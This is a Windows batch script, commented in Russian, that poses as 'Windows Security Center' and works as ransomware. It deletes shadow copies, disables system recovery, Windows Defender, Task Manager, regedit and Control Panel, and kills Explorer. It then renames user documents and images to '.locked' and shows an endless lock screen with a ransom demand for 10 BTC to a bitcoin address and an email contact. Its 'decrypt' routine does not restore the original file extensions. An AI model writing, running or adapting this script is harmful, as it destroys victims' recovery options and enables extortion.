@echo off
chcp 1251 >nul
setlocal enabledelayedexpansion
title Windows Security Center
color 0a
mode con: cols=80 lines=30

:: ============================================
:: 1. ПОВЫШЕНИЕ ПРИВИЛЕГИЙ (требует запуска от админа)
:: ============================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Требуются права администратора.
    echo Запустите от имени администратора.
    pause >nul
    exit /b 1
)

:: ============================================
:: 2. ОТКЛЮЧЕНИЕ ВОССТАНОВЛЕНИЯ СИСТЕМЫ И ТОЧЕК ДОСТУПА
:: ============================================
echo [INFO] Отключение системных защит...
wmic shadowcopy delete >nul 2>&1
vssadmin delete shadows /all /quiet >nul 2>&1
bcdedit /set {default} recoveryenabled no >nul 2>&1
bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1

:: ============================================
:: 3. БЛОКИРОВКА ИНТЕРФЕЙСА
:: ============================================
echo [INFO] Блокировка интерфейса...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im explorer.exe >nul 2>&1

:: ============================================
:: 4. "ШИФРОВАНИЕ" ФАЙЛОВ (СИМУЛЯЦИЯ)
:: ============================================
echo [INFO] Шифрование пользовательских файлов...
set "userprofile=%USERPROFILE%"
set "extensions=.doc .docx .xls .xlsx .ppt .pptx .pdf .jpg .png .txt .zip .rar .7z .psd .ai .dwg .mp4 .avi .mkv"
set /a counter=0

for %%e in (%extensions%) do (
    for /r "%userprofile%\Desktop" %%f in (*%%e) do (
        if exist "%%f" (
            ren "%%f" "%%~nf.locked" >nul 2>&1
            set /a counter+=1
        )
    )
    for /r "%userprofile%\Documents" %%f in (*%%e) do (
        if exist "%%f" (
            ren "%%f" "%%~nf.locked" >nul 2>&1
            set /a counter+=1
        )
    )
    for /r "%userprofile%\Pictures" %%f in (*%%e) do (
        if exist "%%f" (
            ren "%%f" "%%~nf.locked" >nul 2>&1
            set /a counter+=1
        )
    )
)

:: ============================================
:: 5. СОЗДАНИЕ СООБЩЕНИЯ О ВЫКУПЕ
:: ============================================
set "btc_address=1964tHUaGS5MAhnquyAPDTPiGNg5fWGi2t"
set "ransom_note=%userprofile%\Desktop\!!!_READ_ME_!!!.txt"

(
echo ================================================
echo            ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ
echo ================================================
echo.
echo Все ваши личные файлы были зашифрованы с помощью
echo алгоритма AES-256-RSA.
echo.
echo Чтобы восстановить файлы, вам необходимо:
echo 1. Перевести 10 BTC на адрес:
echo    %btc_address%
echo 2. После перевода отправьте proof транзакции на
echo    email: decrypt2024@protonmail.com
echo 3. Вы получите ключ дешифровки и инструкции.
echo.
echo Срок: 72 часа. После этого ключ будет уничтожен.
echo ================================================
echo [ЗАШИФРОВАНО ФАЙЛОВ: !counter!]
) > "%ransom_note%"

:: ============================================
:: 6. БЕСКОНЕЧНОЕ ОКНО С ТРЕБОВАНИЕМ ВЫКУПА
:: ============================================
:lock_screen
cls
color 4f
echo.
echo  ####################################################
echo  #                ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН        #
echo  #          ВСЕ ФАЙЛЫ ЗАШИФРОВАНЫ (AES-256-RSA)     #
echo  ####################################################
echo.
echo  [*] Ваш ID: %random%%random%%random%%random%
echo  [*] Зашифровано файлов: !counter!
echo.
echo  ====================================================
echo  ДЛЯ ДЕШИФРОВКИ НЕОБХОДИМО ОТПРАВИТЬ 10 BTC
echo  НА АДРЕС: %btc_address%
echo  ====================================================
echo.
echo  После оплаты отправьте proof на:
echo  decrypt2024@protonmail.com
echo.
echo  У вас есть 72 часа. После этого ключ будет удален.
echo.
echo  Инструкция также на рабочем столе: !!!_READ_ME_!!!.txt
echo.
echo  ####################################################
echo.
timeout /t 10 /nobreak >nul
goto lock_screen

:: ============================================
:: КОД ДЕШИФРОВКИ (НЕ ВКЛЮЧЕН В ОСНОВНОЙ СКРИПТ)
:: ============================================
:decrypt
echo [INFO] Дешифровка файлов...
for /r "%userprofile%" %%f in (*.locked) do (
    if exist "%%f" (
        ren "%%f" "%%~nf" >nul 2>&1
    )
)
echo [INFO] Восстановление системных настроек...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /f >nul 2>&1
echo [SUCCESS] Система восстановлена.
pause
exit
